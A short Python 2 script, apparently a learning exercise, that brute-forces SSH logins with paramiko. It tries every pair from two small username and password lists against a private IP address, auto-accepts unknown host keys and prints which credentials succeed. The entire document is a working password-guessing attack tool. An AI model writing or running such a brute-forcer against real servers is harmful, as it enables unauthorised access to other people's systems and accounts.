import paramiko
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
Username=["calismalar","calis","deneme","merhaba"]
Password=["calismalar","calis","deneme","merhaba"]
for i in Username:
    for j in Password:
        try:
            sonuc=client.connect('192.168.213.130', username=i, password=j)
            #print sonuc
            client.close()
            print "Username: ",i," Password: ",j
        except:
            print "Username: ",i," Password: ",j,"baglanti yapilamadi"
